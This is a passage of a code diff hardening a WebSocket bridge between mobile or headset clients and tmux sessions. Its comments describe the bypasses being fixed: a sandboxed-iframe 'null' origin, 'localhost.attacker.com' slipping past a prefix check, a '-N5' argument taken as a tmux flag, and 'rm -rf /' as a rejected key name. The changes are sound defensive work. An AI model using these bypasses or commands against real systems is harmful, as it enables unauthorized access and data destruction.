@@ -13,24 +13,37 @@ import re
 import secrets
 import time
 from collections import deque
+from typing import TYPE_CHECKING
+from urllib.parse import urlsplit
+
+if TYPE_CHECKING:
+    # Annotations only. These are imported lazily at every real use site to
+    # break the ws_handler -> choice_detector -> activity cycle; a TYPE_CHECKING
+    # block gives the annotations something to resolve to without reopening it.
+    from bridge.choice_detector import ChoicePrompt, MultiQuestionForm
 
 from fastapi import WebSocket, WebSocketDisconnect
+from starlette.websockets import WebSocketState
 
 from bridge.server_state import (
     sessions, ios_connections, _ios_lock, broadcast_to_ios, _state_sync_msg,
-    send_signed, verify_message, log_event, _terminal_subs, _terminal_subs_lock,
+    send_signed, verify_message, log_event, _terminal_subs, _terminal_subs_lock, TerminalSub,
+    _terminal_geometry, GeometryLease, set_geometry_release_hook,
     _cancel_terminal_subs_for_session, _cleanup_terminal_subs,
-    _STICKY_ACTIVITY, _dispatch_timestamps,
+    _dispatch_timestamps,
 )
 from bridge.validation import (
-    _sanitize_message, _validate_project_dir, _load_projects,
+    _sanitize_message, _sanitize_dispatch_text, _validate_project_dir, _load_projects,
+    _validate_project_name,
     _MAX_EVENT_PAYLOAD_LEN, _MAX_WS_CONNECTIONS, _is_safe_tmux_target,
     _DISPATCH_RATE_LIMIT, _DISPATCH_RATE_WINDOW, _PROJECTS_PATH,
-    _validate_tmux_pane_target,
+    _validate_tmux_pane_target, _validate_tmux_window_target,
 )
 from bridge.auth import get_auth_token
 from bridge import task_store
 from bridge import tmux_manager
+from bridge import reader
+from bridge import pane_geometry
 from bridge.env_utils import get_subprocess_env
 from bridge.transcript_render import find_transcript_path, render_transcript_cached
 import bridge.server_state as _state
@@ -54,31 +67,44 @@ _KNOWN_WS_TYPES = frozenset({
     "voice_command", "status_request", "tasks_request", "task_create",
     "task_update", "terminal_subscribe", "terminal_unsubscribe",
     "terminal_send_keys", "spawn_session", "stop_session", "kill_session",
-    "set_verbosity",
+    "set_verbosity", "set_client_setting", "speech_floor",
 })
 
 
 _ALLOWED_ORIGINS = frozenset({
-    # Native apps (iOS URLSessionWebSocketTask) don't send Origin headers.
-    # Browsers always send one, so we reject any browser-based origin that
-    # isn't localhost.  This blocks malicious websites from connecting.
-    None, "", "null",
+    # Native apps (iOS URLSessionWebSocketTask, the Android client) send no
+    # Origin header at all, which arrives here as None or "". A browser always
+    # sends one, so anything else must match the loopback hosts below.
+    #
+    # "null" is NOT in this set. It used to be, and it is what a sandboxed
+    # iframe, a data: URL and a file:// page all send -- so any page on the
+    # internet could pass the check by framing itself with
+    # `<iframe sandbox="allow-scripts">`.
+    None, "",
 })
+
+# Hosts a browser-originated WebSocket may come from. Matched on the parsed
+# host, exactly: the previous test was `origin.startswith("http://localhost")`,
+# which also accepted `http://localhost.attacker.com` and
+# `http://127.0.0.1.attacker.com`. WebSockets are exempt from CORS, so Origin is
+# the only browser-facing control on this endpoint.
+_ALLOWED_ORIGIN_HOSTS = frozenset({"localhost", "127.0.0.1", "[::1]", "::1"})
+_ALLOWED_ORIGIN_SCHEMES = frozenset({"http", "https"})
 
 
 def _is_allowed_origin(origin: str | None) -> bool:
     """Return True if the WebSocket Origin header is acceptable."""
     if origin in _ALLOWED_ORIGINS:
         return True
-    # Allow localhost origins (e.g. wscat, test clients)
-    if origin and (
-        origin.startswith("http://localhost")
-        or origin.startswith("http://127.0.0.1")
-        or origin.startswith("https://localhost")
-        or origin.startswith("https://127.0.0.1")
-    ):
-        return True
-    return False
+    if not origin:
+        return False
+    try:
+        parsed = urlsplit(origin)
+    except ValueError:
+        return False
+    if parsed.scheme not in _ALLOWED_ORIGIN_SCHEMES:
+        return False
+    return (parsed.hostname or "").lower() in _ALLOWED_ORIGIN_HOSTS
 
 
 def _replay_status_payload(s) -> dict | None:
@@ -164,16 +190,7 @@ def _connect_replay_decision_messages(all_sessions: dict) -> list[dict]:
         session = all_sessions.get(sid)
         if session is None:
             continue
-        msgs.append({
-            "type": "choice_prompt",
-            "session_id": sid,
-            "project": session.project,
-            "title": choice.title,
-            "options": choice.options,
-            "signature": choice.signature,
-            "input_mode": choice.input_mode,
-            "body": choice.body,
-        })
+        msgs.append(activity._choice_prompt_msg(session, choice))
     return msgs
 
 
@@ -197,39 +214,66 @@ async def ios_websocket(websocket: WebSocket) -> None:
                 if header_name.lower() == "authorization" and header_val.startswith("Bearer "):
                     token = header_val[7:]
                     break
-        if not token or not secrets.compare_digest(token, auth_token):
+        # Encoded before comparing: the token arrives percent-decoded from the
+        # query string, and compare_digest raises TypeError on a str holding any
+        # non-ASCII character — `?token=%C3%A9` crashed the handshake instead of
+        # rejecting it.
+        if not token or not secrets.compare_digest(
+            token.encode("utf-8", "surrogateescape"),
+            auth_token.encode("utf-8", "surrogateescape"),
+        ):
             await websocket.close(code=4001, reason="Unauthorized")
             log_event("error", "bridge", "WebSocket connection rejected: unauthorized")
             return
 
-    # Connection limit
+    # Connection limit. Counted and claimed under ONE lock acquisition: the
+    # check used to release the lock, `await websocket.accept()` (which yields),
+    # and only then append -- so every handshake in flight read the same
+    # pre-append count and they all got in. Measured: 50 concurrent handshakes
+    # against a limit of 10 left 50 in `ios_connections`. Each of those can
+    # subscribe to every session's terminal, and each subscription is its own
+    # poll loop spawning `tmux capture-pane` twice a second.
+    #
+    # The slot is reserved before accept() and released if accept() fails, so the
+    # count can never exceed the limit even transiently.
     async with _ios_lock:
         if len(ios_connections) >= _MAX_WS_CONNECTIONS:
-            await websocket.accept()
-            await websocket.close(code=4002, reason="Too many connections")
-            log_event("warning", "bridge", "WebSocket rejected: connection limit reached")
-            return
+            over_limit = True
+        else:
+            over_limit = False
+            ios_connections.append(websocket)
 
-    await websocket.accept()
-    async with _ios_lock:
-        ios_connections.append(websocket)
+    if over_limit:
+        await websocket.accept()
+        await websocket.close(code=4002, reason="Too many connections")
+        log_event("warning", "bridge", "WebSocket rejected: connection limit reached")
+        return
 
-    # Send current state immediately so the client is up-to-date.
-    await send_signed(websocket,_state_sync_msg())
-
-    # Replay a lens-footer status for EVERY session so a fresh client gets
-    # a populated footer immediately (see _connect_replay_status_messages).
-    for msg in _connect_replay_status_messages(sessions.get_all_sessions()):
-        await send_signed(websocket, msg)
-
-    # Replay any active decision card (choice prompt / multi-question form)
-    # so a client connecting AFTER the rising-edge broadcast still sees it.
-    for msg in _connect_replay_decision_messages(sessions.get_all_sessions()):
-        await send_signed(websocket, msg)
-
-    log_event("warning", "bridge", "iOS client connected")
-
+    # The try/finally starts HERE, immediately after the slot was claimed, not
+    # after the replay below. `accept()` and every `send_signed` in between can
+    # raise -- a client that drops the moment it connects is ordinary -- and any
+    # raise before the `finally` left the socket in `ios_connections` forever.
+    # That leak was survivable while the connection limit was racy and
+    # over-subscribable; with the limit actually enforced, ten of them lock every
+    # client out until the bridge restarts.
     try:
+        await websocket.accept()
+
+        # Send current state immediately so the client is up-to-date.
+        await send_signed(websocket,_state_sync_msg())
+
+        # Replay a lens-footer status for EVERY session so a fresh client gets
+        # a populated footer immediately (see _connect_replay_status_messages).
+        for msg in _connect_replay_status_messages(sessions.get_all_sessions()):
+            await send_signed(websocket, msg)
+
+        # Replay any active decision card (choice prompt / multi-question form)
+        # so a client connecting AFTER the rising-edge broadcast still sees it.
+        for msg in _connect_replay_decision_messages(sessions.get_all_sessions()):
+            await send_signed(websocket, msg)
+
+        log_event("warning", "bridge", "iOS client connected")
+
         while True:
             raw = await websocket.receive_text()
             _state.bump_inbound("received")
@@ -243,6 +287,21 @@ async def ios_websocket(websocket: WebSocket) -> None:
             except (json.JSONDecodeError, ValueError):
                 _state.bump_inbound("malformed")
                 log_event("warning", "bridge", "Malformed JSON on WebSocket")
+                continue
+
+            # A frame has to be a JSON OBJECT. `dict(data)` below raises on a
+            # list or a scalar, and the loop catches only WebSocketDisconnect,
+            # so `["a"]` or `42` tore the connection down -- subscriptions and
+            # geometry lease with it -- where a malformed frame should just be
+            # dropped like any other.
+            if not isinstance(data, dict):
+                _state.bump_inbound("malformed")
+                log_event("warning", "bridge", "WS frame was not a JSON object")
+                continue
+
+            if not _frame_string_fields_ok(data):
+                _state.bump_inbound("malformed")
+                log_event("warning", "bridge", "WS frame had a non-string session_id/target")
                 continue
 
             # Verify HMAC signature when auth is enabled
@@ -287,9 +346,23 @@ async def ios_websocket(websocket: WebSocket) -> None:
                 await _handle_kill_session(data, websocket)
             elif msg_type == "set_verbosity":
                 await _handle_set_verbosity(data)
+            elif msg_type == "set_client_setting":
+                await _handle_set_client_setting(websocket, data)
+            elif msg_type == "speech_floor":
+                await _handle_speech_floor(websocket, data)
     except WebSocketDisconnect:
         pass
     finally:
+        # Before the subscriptions go: a disconnecting client must not leave
+        # the user's pane stuck at its panel size.
+        await _release_all_geometry(websocket)
+        # Nor the phones and the Mac silent for a headset that has gone.
+        if _state.release_speech_floor_of(websocket):
+            log_event("info", "bridge", "Speech floor released: its headset disconnected")
+            try:
+                await broadcast_to_ios(_state._state_sync_msg())
+            except Exception:
+                pass
         await _cleanup_terminal_subs(websocket)
         async with _ios_lock:
             try:
@@ -304,9 +377,45 @@ async def ios_websocket(websocket: WebSocket) -> None:
 # ---------------------------------------------------------------------------
 
 
+#: Caps on client-supplied task text. Unbounded, each `task_create` wrote a
+#: file of whatever size under ~/.claude/tasks/ with no count limit, and both
+#: fields are broadcast verbatim to every client and rendered on the lens.
+_MAX_TASK_TEXT = 500
+
+
+def _valid_task_project(raw: object) -> str | None:
+    """A task-list name safe to use as a directory, or None.
+
+    ``_validate_project_name`` is not enough on its own here: its character class
+    permits "." and "..", and the value becomes a path component under
+    ``~/.claude/tasks/``. ``task_store._sanitize_id`` raises ValueError on those,
+    which used to escape the handler -- out of the WebSocket receive loop, which
+    catches only WebSocketDisconnect, tearing the client's connection down (and
+    its terminal subscriptions and geometry lease with it).
+    """
+    if not isinstance(raw, str):
+        return None
+    name = raw.strip()
+    if not name or name in (".", "..") or "/" in name or "\\" in name:
+        return None
+    if _validate_project_name(name) is not None:
+        return None
+    return name
+
+
+def _task_text(raw: object) -> str:
+    """Client-supplied task text, sanitized and capped."""
+    if not isinstance(raw, str):
+        return ""
+    return _sanitize_message(raw)[:_MAX_TASK_TEXT]
+
+
 async def _send_tasks_sync(project: str, ws: WebSocket) -> None:
     """Send a tasks_sync message for a project to a single WebSocket."""
-    list_id = task_store.resolve_task_list_id(project)
+    try:
+        list_id = task_store.resolve_task_list_id(project)
+    except ValueError:
+        return
     tasks = task_store.list_tasks(list_id) if list_id else []
     try:
         await send_signed(ws,{
@@ -320,7 +429,7 @@ async def _send_tasks_sync(project: str, ws: WebSocket) -> None:
 
 async def _handle_tasks_request(data: dict, ws: WebSocket) -> None:
     """Respond with all tasks for the requested project."""
-    project = data.get("project", "")
+    project = _valid_task_project(data.get("project"))
     if not project:
         return
     await _send_tasks_sync(project, ws)
@@ -328,34 +437,42 @@ async def _handle_tasks_request(data: dict, ws: WebSocket) -> None:
 
 async def _handle_task_create(data: dict, ws: WebSocket) -> None:
     """Create a task and respond with updated task list."""
-    project = data.get("project", "")
-    subject = data.get("subject", "")
+    project = _valid_task_project(data.get("project"))
+    subject = _task_text(data.get("subject"))
     if not project or not subject:
         return
-    description = data.get("description", "")
-    active_form = data.get("activeForm", "")
-    list_id = task_store.resolve_task_list_id(project) or project
-    task_store.create_task(list_id, subject, description, active_form)
+    description = _task_text(data.get("description"))
+    active_form = _task_text(data.get("activeForm"))
+    try:
+        list_id = task_store.resolve_task_list_id(project) or project
+        task_store.create_task(list_id, subject, description, active_form)
+    except ValueError:
+        return
     log_event("success", project, f"Task created (WS): {subject}")
     await _send_tasks_sync(project, ws)
 
 
 async def _handle_task_update(data: dict, ws: WebSocket) -> None:
     """Update a task and respond with updated task list."""
-    project = data.get("project", "")
+    project = _valid_task_project(data.get("project"))
     task_id = data.get("task_id", "")
-    if not project or not task_id:
+    if not project or not isinstance(task_id, str) or not task_id:
         return
     updates = {}
     for field in ("status", "subject", "description", "activeForm"):
         if field in data:
-            updates[field] = data[field]
+            # Capped and sanitized like create: `subject` and `activeForm` are
+            # broadcast verbatim in sub_agent_update and drawn on the glasses.
+            updates[field] = _task_text(data[field])
     if not updates:
         return
-    list_id = task_store.resolve_task_list_id(project)
-    if list_id:
-        task_store.update_task(list_id, task_id, **updates)
-        log_event("info", project, f"Task {task_id} updated (WS): {updates}")
+    try:
+        list_id = task_store.resolve_task_list_id(project)
+        if list_id:
+            task_store.update_task(list_id, task_id, **updates)
+            log_event("info", project, f"Task {task_id} updated (WS): {updates}")
+    except ValueError:
+        return
     await _send_tasks_sync(project, ws)
 
 
@@ -398,6 +515,373 @@ _WORKING_TICK_RESEND_SECONDS = 2.0
 # escaping overhead (ESC encodes as 6 chars), ~600k raw chars keeps the
 # encoded frame comfortably under it. Oldest lines are dropped first.
 _MAX_OUTBOUND_CONTENT_CHARS = 600_000
+
+# Terminal render modes. ``filtered`` (the default, and what every client
+# before the headset sends) runs the chrome strippers in _apply_chrome_filters;
+# ``ansi`` ships the pane verbatim. Both carry SGR escapes on the wire --
+# capture-pane runs with -e and neither path strips them.
+#
+# An unknown mode falls back to ``filtered`` rather than erroring: a client
+# newer than the bridge must degrade to a working terminal, never a dead one.
+_TERMINAL_MODES = frozenset({"filtered", "ansi"})
+_DEFAULT_TERMINAL_MODE = "filtered"
+
+
+def _coerce_terminal_mode(value: object) -> str:
+    """Normalize a client-supplied terminal mode, defaulting to ``filtered``."""
+    mode = value if isinstance(value, str) else ""
+    mode = mode.strip().lower()
+    return mode if mode in _TERMINAL_MODES else _DEFAULT_TERMINAL_MODE
+
+
+# Bounds for a client-requested pane size. These land in tmux argv, so they
+# are hard-validated as plain ints rather than trusted: anything outside the
+# window is dropped and the pane keeps whatever size it already had.
+# The ceiling is generous (a headset panel is ~80x48) but finite -- tmux
+# allocates a grid per window, so a client asking for 100000 rows would burn
+# real memory on the dev machine.
+_MIN_TERMINAL_COLS, _MAX_TERMINAL_COLS = 20, 500
+_MIN_TERMINAL_ROWS, _MAX_TERMINAL_ROWS = 5, 200
+
+# tmux key names accepted in the `key_sequence` form. This is the set tmux
+# itself documents; a name outside it is rejected with an error rather than
+# handed to tmux, because tmux exits non-zero on an unknown key name and -- see
+# _send_tmux_keys -- a silent no-op is exactly the failure mode we are trying
+# to kill. Compared case-insensitively.
+_TMUX_NAMED_KEYS: frozenset[str] = frozenset(
+    k.lower()
+    for k in (
+        "Enter", "Escape", "Space", "Tab", "BTab", "BSpace",
+        "DC", "Delete", "IC", "Insert", "Home", "End",
+        "NPage", "PageDown", "PgDn", "PPage", "PageUp", "PgUp",
+        "Up", "Down", "Left", "Right",
+        *(f"F{n}" for n in range(1, 13)),
+    )
+)
+# Modifier prefixes tmux understands: Ctrl, Meta/Alt, Shift.
+_TMUX_MODIFIERS: frozenset[str] = frozenset("CMS")
+_MAX_KEY_NAME_LEN = 32
+_MAX_KEY_SEQUENCE = 64
+
+
+def _is_valid_tmux_key(name: object) -> bool:
+    """True when *name* is a tmux key name we are willing to forward.
+
+    Accepts an optional run of ``C-``/``M-``/``S-`` modifier prefixes followed
+    by either a documented key name or a single printable character, so
+    ``C-c``, ``M-Enter``, ``S-Tab``, ``F5`` and ``a`` all pass while
+    ``rm -rf /`` and ``Entr`` do not.
+    """
+    if not isinstance(name, str) or not name or len(name) > _MAX_KEY_NAME_LEN:
+        return False
+    body = name
+    while len(body) > 2 and body[0] in _TMUX_MODIFIERS and body[1] == "-":
+        body = body[2:]
+    if body.lower() in _TMUX_NAMED_KEYS:
+        return True
+    return len(body) == 1 and body.isprintable()
+
+
+def _coerce_key_sequence(value: object) -> list[str] | None:
+    """Validate a ``key_sequence`` payload, or ``None`` when it is unusable.
+
+    One WebSocket message carries a whole sequence -- a Bluetooth keyboard on
+    the headset produces ``["C-c", "Enter"]`` far more often than it produces a
+    single keystroke, and tmux ``send-keys`` takes them all in one call, so
+    this is one round trip and one subprocess instead of N of each.
+    """
+    if not isinstance(value, list) or not value:
+        return None
+    if len(value) > _MAX_KEY_SEQUENCE:
+        return None
+    if not all(_is_valid_tmux_key(k) for k in value):
+        return None
+    return list(value)
+
+
+async def _send_tmux_keys(
+    target: str, args: list[str], *, literal: bool
+) -> tuple[bool, str]:
+    """Run ``tmux send-keys``, returning ``(ok, error)``.
+
+    **Checks the return code.** ``send-keys`` against a dead pane exits
+    non-zero without raising -- that silent failure is what wedged a session
+    in "Sending to <project>" once already (see test_dispatch_dead_pane). The
+    raw-keys path used to have the same hole: it awaited the process and threw
+    the result away, so typing into a dead pane did nothing, with nothing said.
+    """
+    cmd = ["tmux", "send-keys", "-t", target]
+    if literal:
+        cmd.append("-l")
+    # End of options: without it a payload beginning with "-" is read as a tmux
+    # flag instead of as keys. "-N5" is send-keys' repeat count -- tmux exits 0,
+    # nothing reaches the pane, and the caller is told the keys were delivered.
+    cmd.append("--")
+    cmd.extend(args)
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.PIPE,
+            env=get_subprocess_env(),
+        )
+        _, stderr = await asyncio.wait_for(proc.communicate(), timeout=5.0)
+    except Exception as exc:
+        return False, str(exc)
+    if proc.returncode != 0:
+        return False, (stderr.decode(errors="replace").strip() if stderr else "unknown error")
+    return True, ""
+
+
+def _coerce_terminal_geometry(data: dict) -> tuple[int, int] | None:
+    """Pull a sane (cols, rows) out of a subscribe payload, else ``None``.
+
+    ``bool`` is a subclass of ``int`` in Python, so it is excluded explicitly
+    -- ``{"cols": true}`` must not resize a pane to one column.
+    """
+    cols, rows = data.get("cols"), data.get("rows")
+    if isinstance(cols, bool) or isinstance(rows, bool):
+        return None
+    if not isinstance(cols, int) or not isinstance(rows, int):
+        return None
+    if not (_MIN_TERMINAL_COLS <= cols <= _MAX_TERMINAL_COLS):
+        return None
+    if not (_MIN_TERMINAL_ROWS <= rows <= _MAX_TERMINAL_ROWS):
+        return None
+    return cols, rows
+
+
+async def _tmux(*args: str) -> tuple[int, str]:
+    """Run a tmux command, returning ``(returncode, stdout)``.
+
+    Never raises: geometry is a nicety, and a tmux hiccup must not take down
+    a terminal subscription.
+    """
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            "tmux", *args,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.DEVNULL,
+            env=get_subprocess_env(),
+        )
+        stdout, _ = await proc.communicate()
+        return proc.returncode or 0, stdout.decode("utf-8", errors="replace").strip()
+    except Exception:
+        return 1, ""
+
+
+async def _read_window_geometry(target: str) -> tuple[int, int, str] | None:
+    """Current ``(cols, rows, window-size option)`` for *target*'s window.
+
+    The option comes back ``""`` when the window inherits the global value.
+    """
+    rc, out = await _tmux("display-message", "-t", target, "-p",
+                          "#{window_width}x#{window_height}")
+    if rc != 0 or "x" not in out:
+        return None
+    width, _, height = out.partition("x")
+    try:
+        cols, rows = int(width), int(height)
+    except ValueError:
+        return None
+    _rc, opt = await _tmux("show-options", "-w", "-t", target, "-v", "window-size")
+    return cols, rows, opt
+
+
+# How long a lease is protected from handover. Long enough that two clients
+# genuinely contending settle instead of trading resizes at poll rate; short
+# enough that a client relaunching does not have to wait to draw correctly.
+_GEOMETRY_HANDOVER_COOLDOWN = 3.0
+
+
+def _holder_is_live(ws: WebSocket) -> bool:
+    """True when the bridge still *believes* it is serving *ws*.
+
+    Deliberately weak, and not the whole liveness answer. A client killed
+    without closing its socket leaves a half-open TCP connection: the server
+    stays blocked in ``receive``, the connection is still on the list, and
+    ``client_state`` still reads CONNECTED. This returns True for that client
+    -- which is precisely why handover cannot rest on it alone. It only catches
+    the holder the bridge has already finished tearing down.
+    """
+    if ws not in _state.ios_connections:
+        return False
+    state = getattr(ws, "client_state", None)
+    return state is None or state == WebSocketState.CONNECTED
+
+
+async def _acquire_geometry(
+    session_id: str, target: str, ws: WebSocket, cols: int, rows: int
+) -> bool:
+    """Take (or update) this session's geometry lease and resize the window.
+
+    A live ``ansi`` subscriber keeps the pane: two clients trading resizes
+    would reflow the TUI on every poll, so a second one asking for a different
+    size is refused (and told, by the caller -- silence here is what made this
+    invisible for a day).
+
+    **A lease outlives its holder, and liveness cannot be asked for.** A client
+    killed without closing its socket leaves a half-open connection: the server
+    stays blocked in ``receive``, the connection is still on the list, and
+    ``client_state`` still reads CONNECTED. Every signal the bridge has says
+    the dead client is fine. So handover is gated on the lease's **age**
+    instead: a claim older than the cooldown yields to a new client, which
+    lets a relaunched app take the pane back, while two clients genuinely
+    contending are each blocked inside the window and settle rather than
+    trading resizes on every poll.
+
+    A takeover keeps the previous holder's ``prev_*`` values, which are the
+    pane's *real* original size -- restoring to the width the dead client left
+    behind would make the damage permanent.
+    """
+    held = _terminal_geometry.get(session_id)
+    if held is not None and held.ws is not ws:
+        fresh = (time.monotonic() - held.acquired_at) < _GEOMETRY_HANDOVER_COOLDOWN
+        if fresh and _holder_is_live(held.ws):
+            log_event(
+                "warning",
+                "bridge",
+                f"Geometry {cols}x{rows} refused: {session_id[:12]}... claimed moments ago",
+            )
+            return False
+        log_event(
+            "info",
+            "bridge",
+            f"Geometry handover for {session_id[:12]}...: {held.cols}x{held.rows} -> {cols}x{rows}",
+        )
+
+    if held is None:
+        current = await _read_window_geometry(target)
+        if current is None:
+            return False
+        prev_cols, prev_rows, prev_opt = current
+    else:
+        if (held.cols, held.rows) == (cols, rows):
+            return True  # already this size; skip the subprocess
+        prev_cols, prev_rows, prev_opt = held.prev_cols, held.prev_rows, held.prev_window_size
+
+    rc, _ = await _tmux("resize-window", "-t", target, "-x", str(cols), "-y", str(rows))
+    if rc != 0:
+        return False
+    _terminal_geometry[session_id] = GeometryLease(
+        ws=ws, cols=cols, rows=rows,
+        prev_cols=prev_cols, prev_rows=prev_rows, prev_window_size=prev_opt,
+        acquired_at=time.monotonic(),
+    )
+    # Write the undo down before anyone depends on it. A lease lives in memory
+    # and is released by the socket teardown, so a killed bridge used to drop
+    # the only record of the pane's real size -- and the next client then read
+    # the panel size as the original and made it permanent. See
+    # `bridge/pane_geometry.py`.
+    pane_geometry.record(target, prev_cols, prev_rows, prev_opt)
+    return True
+
+
+async def _restore_window(target: str, cols: int, rows: int, window_size: str) -> None:
+    """Put *target*'s window back to *cols* x *rows* and *window_size*.
+
+    Order matters: dimensions first, then the ``window-size`` option.
+    ``resize-window`` sets that option to ``manual`` as a side effect, so
+    clearing it first would just get it set again by the restore.
+
+    Shared by the ordinary release and the startup sweep for the panes a killed
+    bridge left pinned, because "put a window back" written twice is how the
+    two would come to disagree -- and the sweep is the path nobody watches.
+    """
+    await _tmux("resize-window", "-t", target, "-x", str(cols), "-y", str(rows))
+    if window_size:
+        await _tmux("set-option", "-w", "-t", target, "window-size", window_size)
+    else:
+        await _tmux("set-option", "-w", "-t", target, "-u", "window-size")
+
+
+async def _release_geometry(session_id: str, ws: WebSocket) -> None:
+    """Give a session's window its original size back. No-op unless *ws* holds it.
+
+    The persisted record is dropped only once the window has actually been put
+    back, which is why the early return below leaves it in place: a session
+    pruned out from under its lease takes the only copy of its tmux target with
+    it, so release cannot reach the pane -- but the record is keyed by window
+    and ``restore_stranded_panes`` can, on the next start. Forgetting it here
+    would be tidier and would strand the pane.
+    """
+    lease = _terminal_geometry.get(session_id)
+    if lease is None or lease.ws is not ws:
+        return
+    del _terminal_geometry[session_id]
+
+    session = sessions.get_session(session_id)
+    target, err = _validate_tmux_pane_target(session.tmux_target if session else None)
+    if err or not target:
+        return  # the target is unknown here; the startup sweep still has it
+    # The persisted record outranks the lease -- see `pane_geometry.lookup`.
+    # `lease.prev_*` is what the window measured when *this* lease was taken,
+    # which is the stranded size whenever a previous run was killed holding it.
+    # Restoring to that is a no-op, and the `forget` below then discards the
+    # only copy of the real size, so the pane is stuck for good with nothing
+    # left to put it back. The record is first-writer-wins across restarts and
+    # still holds the size the developer actually had.
+    owed = pane_geometry.lookup(target)
+    if owed is not None:
+        await _restore_window(target, owed.cols, owed.rows, owed.window_size)
+    else:
+        await _restore_window(target, lease.prev_cols, lease.prev_rows, lease.prev_window_size)
+    pane_geometry.forget(target)
+
+
+async def _release_all_geometry(ws: WebSocket) -> None:
+    """Drop every lease held by a disconnecting client."""
+    for session_id in [sid for sid, lease in _terminal_geometry.items() if lease.ws is ws]:
+        await _release_geometry(session_id, ws)
+
+
+async def restore_stranded_panes() -> int:
+    """Put back every window a previous run resized and never released.
+
+    Called once at startup, before anything is served. After a clean shutdown
+    this finds nothing, because each release calls ``pane_geometry.forget``;
+    what it does find is the aftermath of a kill -- a crash, a `kill -9`, a
+    rebuilt ``.app`` -- which used to leave the developer's pane at panel width
+    with ``window-size manual`` set, no longer tracking their terminal, and no
+    record anywhere of what it had been.
+
+    A window that no longer exists is simply forgotten: there is nothing to put
+    back, and keeping the record would mean trying again on every start.
+
+    Returns how many windows were restored, for the log and for the tests.
+    """
+    owed = pane_geometry.pending()
+    if not owed:
+        return 0
+    restored = 0
+    for pane in owed:
+        # The record is a file on disk, which is the weakest provenance of any
+        # tmux target in this module -- every other one is validated, and this
+        # one is fed to tmux unattended at startup. A window target has no
+        # `.pane`, so the pane validator cannot be reused directly.
+        target, err = _validate_tmux_window_target(pane.window)
+        if err or not target:
+            log_event("warning", "bridge", f"Pane geometry: refusing {pane.window!r}: {err}")
+            continue
+        if await _read_window_geometry(pane.window) is None:
+            log_event("info", "bridge", f"Pane geometry: {pane.window} is gone; forgetting it")
+            continue
+        await _restore_window(pane.window, pane.cols, pane.rows, pane.window_size)
+        restored += 1
+        log_event(
+            "warning",
+            "bridge",
+            f"Pane geometry: restored {pane.window} to {pane.cols}x{pane.rows} "
+            "(a previous run was killed while holding it)",
+        )
+    pane_geometry.clear()
+    return restored
+
+
+# server_state tears subscriptions down on its own for pruned sessions, and
+# the pane survives a re-registration under a new id, so it needs a way back
+# in here to drop the lease.
+set_geometry_release_hook(_release_geometry)
 
 
 # Substring markers that identify Claude Code's status footer rows. Kept
@@ -708,6 +1192,24 @@ _TASK_CHECKBOX_CHARS: frozenset[str] = frozenset(
     "□◻▢☐☑☒✓✔■◼▪▮"
 )
 
+# The set above splits on one axis that matters for false positives:
+#
+#   BOX glyphs (□◻▢☐☑☒■◼▪▮) are TodoWrite-only. Nothing else in a coding
+#   pane opens a line with them, so they stay a context-free signal and a
+#   stranded widget row still gets stripped wherever it sits.
+#
+#   CHECK glyphs (✓✔) are shared with the rest of the world. Test runners
+#   open their PASS lines with them -- vitest prints a `✓` per file, pytest
+#   plugins and most build tools do the same. Stripping those context-free
+#   mangles output asymmetrically, because the matching FAIL glyphs (✗ ×)
+#   are not in the set: the user saw "✗ 2 failed" with the "✓ 41 passed"
+#   above it silently removed, which reads as if nothing passed.
+#
+# So a bare CHECK row only counts as a widget row when it actually sits in
+# a widget -- see _task_row_class and _strip_task_summary.
+_TASK_CHECK_GLYPHS: frozenset[str] = frozenset("✓✔")
+_TASK_BOX_GLYPHS: frozenset[str] = _TASK_CHECKBOX_CHARS - _TASK_CHECK_GLYPHS
+
 # Box-drawing tree connectors Claude Code uses to attach the FIRST task
 # row of the TodoWrite widget to a parent fold (extended-thinking,
 # sub-agent, etc.). Without skipping these, `stripped[0]` lands on the
@@ -732,7 +1234,11 @@ _TASK_TREE_PREFIX_CHARS: frozenset[str] = frozenset("└├╰╭│─ \t")
 # an ordinary working line ("* Blanching… (54s · ↓ 1.3k tokens)") misses
 # the literal "thinking" inside the parens, so it survives untouched.
 _THINKING_FOLD_RE = re.compile(
-    r"^[+*✳✴✶✷✸✻✽✱·∙⠇-⣿]+\s+\S.*\([^)]*\bthinking\b[^)]*\)",
+    # `.*\(` plus two adjacent `[^)]*` was ambiguous the same way
+    # _WORKING_STATUS_RE was (see the note there): "." and "[^)]" both match
+    # "(", so every paren was retried as the anchor. Excluding "(" from the
+    # run-up and bounding both gaps makes it linear.
+    r"^[+*✳✴✶✷✸✻✽✱·∙⠇-⣿]+\s+\S[^(]{0,200}\([^)]{0,120}\bthinking\b[^)]{0,120}\)",
     re.IGNORECASE,
 )
 
@@ -745,38 +1251,78 @@ def _is_task_summary_row(line: str) -> bool:
     thinking-block parent line) so a single global filter removes the
     whole block regardless of where it sits in the captured pane.
     """
+    return _task_row_class(line) != ""
+
+
+def _task_row_class(line: str) -> str:
+    """Classify *line* against Claude Code's TodoWrite widget.
+
+    Returns:
+        ``"anchor"`` -- an unambiguous widget marker (header, truncation
+            tail, thinking fold, a BOX-glyph checkbox row, or any checkbox
+            behind a box-drawing tree connector). Safe to strip anywhere,
+            and it is what lends context to a neighbouring check row.
+        ``"check"`` -- a bare ``✓``/``✔`` row with no other widget signal.
+            Might be a completed task; might be a test runner's pass line.
+            Only `_strip_task_summary` can tell, by looking at neighbours.
+        ``""`` -- not a widget row.
+    """
     plain = _strip_ansi(line)
     stripped = plain.strip()
     if not stripped:
-        return False
+        return ""
     if _TASK_SUMMARY_HEADER_RE.match(stripped):
-        return True
+        return "anchor"
     if _TASK_SUMMARY_TAIL_RE.match(stripped):
-        return True
+        return "anchor"
     if _THINKING_FOLD_RE.match(stripped):
-        return True
-    if stripped[0] in _TASK_CHECKBOX_CHARS:
-        return True
+        return "anchor"
+    head = stripped[0]
+    if head in _TASK_BOX_GLYPHS:
+        return "anchor"
+    if head in _TASK_CHECK_GLYPHS:
+        return "check"
     # Strip leading box-drawing tree connectors (e.g. `└ `, `├─ `) and
     # try again — Claude Code uses these to attach the first widget row
-    # to a folded parent block.
+    # to a folded parent block. A real connector is itself a widget
+    # signal, so a ✓ behind one is an anchor rather than ambiguous:
+    # no test runner draws box-drawing corners around its pass lines.
     inner = stripped.lstrip("".join(_TASK_TREE_PREFIX_CHARS))
     if inner and inner[0] in _TASK_CHECKBOX_CHARS:
